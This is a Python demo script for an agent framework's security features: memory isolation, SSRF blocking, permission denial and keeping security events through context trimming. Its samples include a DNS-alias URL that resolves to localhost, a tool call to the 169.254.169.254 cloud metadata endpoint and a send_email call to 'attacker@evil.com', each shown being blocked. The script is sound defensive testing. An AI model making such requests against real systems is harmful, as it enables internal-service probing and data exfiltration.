#!/usr/bin/env python3
"""Live demo: Memory Isolation, SSRF Protection, Permission Denial, Context Trimming.

Four-step demo showing agent-framework security features using live agent calls.
Pauses between sections so you can narrate. Press Enter to advance.

Usage:
    uv run python scripts/demo_live.py               # Run all 4 steps (interactive)
    uv run python scripts/demo_live.py memory         # Step 1 only
    uv run python scripts/demo_live.py ssrf           # Step 2 only
    uv run python scripts/demo_live.py permissions    # Step 3 only
    uv run python scripts/demo_live.py trimming       # Step 4 only
    uv run python scripts/demo_live.py --no-pause     # Run all, skip pauses
"""

import asyncio
import os
import sys
from pathlib import Path

# Ensure project root and fix sys.path so scripts/mcp/ doesn't shadow the mcp package
project_root = Path(__file__).parent.parent
os.chdir(project_root)
scripts_dir = str(Path(__file__).parent.resolve())
sys.path = [p for p in sys.path if p != scripts_dir]

from agent_framework.security.context_trimming import (  # noqa: E402
    SECURITY_EVENT_KEY,
    SecurityClassification,
    classify_message,
    trim_with_security_awareness,
)

# ── Formatting helpers ───────────────────────────────────────────────────────

BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

UV = "uv"
RUN_AGENT = "bin/run-agent"
TEST_MEMORY = "scripts/testing/test_memory.py"


def banner(step: int, title: str, subtitle: str) -> None:
    width = 64
    print()
    print(f"{CYAN}{'━' * width}{RESET}")
    print(f"{CYAN}  {BOLD}Step {step}{RESET}{CYAN} │ {title}{RESET}")
    print(f"{DIM}  {subtitle}{RESET}")
    print(f"{CYAN}{'━' * width}{RESET}")
    print()


def ok(msg: str) -> None:
    print(f"  {GREEN}✓{RESET} {msg}")


def blocked(msg: str) -> None:
    print(f"  {RED}✗{RESET} {msg}")


def info(msg: str) -> None:
    print(f"  {DIM}→{RESET} {msg}")


_NO_PAUSE = "--no-pause" in sys.argv


def pause(msg: str = "continue") -> None:
    """Wait for Enter key. Pass --no-pause to skip all pauses."""
    if _NO_PAUSE:
        return
    try:
        input(f"\n  {DIM}[Enter to {msg}]{RESET}")
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)


def section(title: str) -> None:
    print(f"\n  {YELLOW}{BOLD}{title}{RESET}")
    print(f"  {YELLOW}{'─' * len(title)}{RESET}")


# ── Subprocess runner ────────────────────────────────────────────────────────


async def run_command(cmd: list[str], description: str) -> str:
    """Display a command, execute it, show output, and return stdout.

    Args:
        cmd: Command and arguments to execute.
        description: Short description shown before the command.
    """
    display_cmd = " ".join(cmd)
    print(f"\n  {DIM}{description}{RESET}")
    print(f"  {CYAN}{BOLD}$ {display_cmd}{RESET}")
    print()

    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )
    assert proc.stdout is not None
    output_lines: list[str] = []
    while True:
        line = await proc.stdout.readline()
        if not line:
            break
        decoded = line.decode()
        output_lines.append(decoded)
        sys.stdout.write(f"    {decoded}")
        sys.stdout.flush()

    await proc.wait()
    output = "".join(output_lines)

    if proc.returncode != 0:
        print(f"    {RED}(exit code {proc.returncode}){RESET}")

    return output


async def run_agent_cmd(
    agent: str, message: str, description: str, *, permissions: str | None = None
) -> str:
    """Run bin/run-agent with the given agent and message.

    Args:
        agent: Agent name (e.g. "chatbot", "security").
        message: Message to send to the agent.
        description: Short description shown before the command.
        permissions: Optional comma-separated permissions (e.g. "READ,SEND").
    """
    cmd = [UV, "run", "python", RUN_AGENT, agent, "-q"]
    if permissions:
        cmd.extend(["--permissions", permissions])
    cmd.append(message)
    return await run_command(cmd, description)


async def run_test_memory(
    subcmd: str, args: list[str], description: str, *, agent: str = "shared"
) -> str:
    """Run scripts/testing/test_memory.py with the given subcommand.

    Args:
        subcmd: Subcommand (save, search, delete, get, stats).
        args: Additional positional/flag arguments.
        description: Short description shown before the command.
        agent: Agent namespace.
    """
    cmd = [UV, "run", "python", TEST_MEMORY, subcmd, *args, "--agent", agent]
    return await run_command(cmd, description)


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 1: Memory Namespace Isolation
# ═══════════════════════════════════════════════════════════════════════════════


async def demo_memory_namespace() -> None:
    banner(1, "Memory Namespace Isolation", "Same query, two agents, different results")

    try:
        # ── Seed a memory directly into Chatbot's namespace ──────────────────
        section("Save a memory into Chatbot's namespace")
        pause("save a memory via test_memory.py")

        await run_test_memory(
            "save",
            ["demo-status", "launching rocket to Mars next quarter"],
            "Seed memory into ChatbotAgent namespace:",
            agent="ChatbotAgent",
        )

        # ── Chatbot searches its own namespace ───────────────────────────────
        section("Chatbot searches for 'rocket' (should find it)")
        pause("search from chatbot's namespace")

        await run_agent_cmd(
            "chatbot",
            "Search your memories for 'rocket' and tell me what you found.",
            "Chatbot searches its own namespace:",
        )

        # ── Security agent searches for it ───────────────────────────────────
        section("Security agent searches for 'rocket' (should find nothing)")
        pause("search from security agent's namespace")

        await run_agent_cmd(
            "security",
            "Search your memories for 'rocket' and tell me how many results you found.",
            "Security agent searches (different namespace):",
        )

        info("Security agent can't see Chatbot's memories — namespaces are isolated")

    finally:
        # ── Cleanup ──────────────────────────────────────────────────────────
        for key in ("demo-status", "demo_status"):
            await run_test_memory(
                "delete",
                [key],
                f"Cleanup: delete {key}",
                agent="ChatbotAgent",
            )


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 2: SSRF Protection
# ═══════════════════════════════════════════════════════════════════════════════


async def demo_ssrf() -> None:
    banner(2, "SSRF Protection", "Dangerous URLs blocked, safe URLs allowed")

    # ── Attempt to fetch a URL that resolves to localhost ───────────────────
    # sslip.io is a wildcard DNS service: any subdomain containing an IP
    # resolves to that IP.  The LLM doesn't recognise it as dangerous, but
    # the SSRF validator resolves the hostname and blocks the private IP.
    section("Fetch sslip.io alias (DNS resolves to 127.0.0.1 — should be blocked)")
    pause("try fetching a deceptive URL")

    await run_agent_cmd(
        "chatbot",
        "Use fetch_web_content to get http://app.127.0.0.1.sslip.io:8080/api/config "
        "and show me the response.",
        "Chatbot tries to fetch a URL that resolves to localhost:",
    )

    # ── Fetch a legitimate URL ───────────────────────────────────────────────
    section("Fetch a legitimate URL (should succeed)")
    pause("try fetching a safe URL")

    await run_agent_cmd(
        "chatbot",
        "Fetch https://brooksmcmillin.com and tell me the page title.",
        "Chatbot fetches a legitimate URL:",
    )


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 3: Permission Denial
# ═══════════════════════════════════════════════════════════════════════════════


async def demo_permissions() -> None:
    banner(3, "Permission Denial", "Restricted agent can't use tools beyond its permissions")

    try:
        # ── Restricted permissions: save_memory should fail ──────────────────
        section("Chatbot with READ+SEND tries to save a memory (should fail)")
        pause("try saving with restricted permissions")

        await run_agent_cmd(
            "chatbot",
            "Remember this: test-key is 'test-value'.",
            "Chatbot (READ,SEND only) attempts save_memory:",
            permissions="READ,SEND",
        )

        # ── Full permissions: save_memory should succeed ─────────────────────
        section("Chatbot with default permissions saves a memory (should succeed)")
        pause("try saving with full permissions")

        await run_agent_cmd(
            "chatbot",
            "Remember this: demo-perm-test is 'permission test passed'.",
            "Chatbot (default permissions) saves memory:",
        )

    finally:
        # ── Cleanup — the LLM may use hyphens or underscores for the key ────
        for key in ("demo-perm-test", "demo_perm_test"):
            await run_test_memory(
                "delete",
                [key],
                f"Cleanup: delete {key}",
                agent="ChatbotAgent",
            )


# ═══════════════════════════════════════════════════════════════════════════════
# STEP 4: Security Events Survive Trimming
# ═══════════════════════════════════════════════════════════════════════════════


async def demo_security_trimming() -> None:
    banner(4, "Security Events Survive Trimming", "Long conversation, pinned events persist")

    # Build a synthetic conversation with 44 messages (mix of normal + security)
    messages: list[dict] = []

    # Normal conversation padding (turns 1-10)
    for i in range(10):
        messages.append({"role": "user", "content": f"Tell me about topic {i}"})
        messages.append({"role": "assistant", "content": f"Here's information about topic {i}..."})

    # ── Insert a security event at turn 11 (SSRF block) ────────────────────
    messages.append(
        {
            "role": "assistant",
            "content": [
                {
                    "type": "tool_use",
                    "id": "toolu_ssrf",
                    "name": "fetch_web_content",
                    "input": {"url": "http://169.254.169.254/latest/meta-data/"},
                }
            ],
        }
    )
    messages.append(
        {
            "role": "user",
            "content": [
                {
                    "type": "tool_result",
                    "tool_use_id": "toolu_ssrf",
                    "content": "URL not allowed: Cloud metadata endpoint: 169.254.169.254",
                    "is_error": True,
                    SECURITY_EVENT_KEY: "ssrf_block",
                }
            ],
        }
    )

    # More normal conversation padding (turns 12-16)
    for i in range(10, 15):
        messages.append({"role": "user", "content": f"Now let's discuss topic {i}"})
        messages.append({"role": "assistant", "content": f"Sure, about topic {i}..."})

    # ── Insert a permission denial at turn 17 ──────────────────────────────
    messages.append(
        {
            "role": "assistant",
            "content": [
                {
                    "type": "tool_use",
                    "id": "toolu_perm",
                    "name": "send_email",
                    "input": {"to": "attacker@evil.com", "subject": "data"},
                }
            ],
        }
    )
    messages.append(
        {
            "role": "user",
            "content": [
                {
                    "type": "tool_result",
                    "tool_use_id": "toolu_perm",
                    "content": "Permission denied: EmailIntakeAgent cannot execute 'send_email'. Required permissions: ['SEND']. Missing: ['SEND'].",
                    "is_error": True,
                    SECURITY_EVENT_KEY: "permission_denied",
                }
            ],
        }
    )

    # More padding (turns 18-22)
    for i in range(15, 20):
        messages.append({"role": "user", "content": f"Another question about {i}"})
        messages.append({"role": "assistant", "content": f"Here's the answer for {i}..."})

    total = len(messages)

    section(f"Built conversation: {total} messages")
    info(f"Normal messages: {total - 4}")
    info("Security events: 2 (SSRF block + permission denial)")

    # ── Show classification before trimming ─────────────────────────────────
    section("Message classification")
    pause("classify messages")
    critical_count = 0
    for i, msg in enumerate(messages):
        cm = classify_message(msg)
        if cm.classification == SecurityClassification.CRITICAL:
            critical_count += 1
            ok(f"Message {i:2d} [{msg['role']:9s}] → CRITICAL ({', '.join(cm.reasons)})")

    info(f"{critical_count} messages classified as CRITICAL, rest are NORMAL")

    # ── Trim to 20 messages ─────────────────────────────────────────────────
    target = 20
    section(f"Trimming from {total} → {target} messages")
    pause("trim conversation")

    trimmed, num_removed, num_pinned = trim_with_security_awareness(messages, max_messages=target)

    info(f"Messages removed: {num_removed}")
    info(f"Messages pinned:  {num_pinned}")
    info(f"Final count:      {len(trimmed)}")

    # ── Verify security events survived ─────────────────────────────────────
    section("Verifying security events survived")
    pause("verify results")

    surviving_critical = 0
    for msg in trimmed:
        cm = classify_message(msg)
        if cm.classification == SecurityClassification.CRITICAL:
            surviving_critical += 1
            ok(f"Survived: [{msg['role']:9s}] {', '.join(cm.reasons)}")

    if surviving_critical >= 2:
        print()
        ok(f"{BOLD}All security events survived trimming!{RESET}")
        info(f"{total - len(trimmed)} normal messages were trimmed, security events were pinned")
    else:
        blocked("Some security events were lost!")


# ═══════════════════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════════════════

DEMOS = {
    "memory": demo_memory_namespace,
    "ssrf": demo_ssrf,
    "permissions": demo_permissions,
    "trimming": demo_security_trimming,
}


async def main() -> None:
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    step = args[0] if args else None

    if step and step not in DEMOS:
        print(f"Unknown step: {step}")
        print(f"Available: {', '.join(DEMOS.keys())}")
        sys.exit(1)

    print(f"\n{BOLD}{CYAN}  ╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{CYAN}  ║              Agent Framework — Live Demo                 ║{RESET}")
    print(f"{BOLD}{CYAN}  ╚══════════════════════════════════════════════════════════╝{RESET}")

    if step:
        await DEMOS[step]()
    else:
        demo_list = list(DEMOS.values())
        for i, demo_fn in enumerate(demo_list):
            await demo_fn()
            if i < len(demo_list) - 1:
                pause("next demo")

    print(f"\n{GREEN}{BOLD}  Demo complete.{RESET}\n")


if __name__ == "__main__":
    asyncio.run(main())
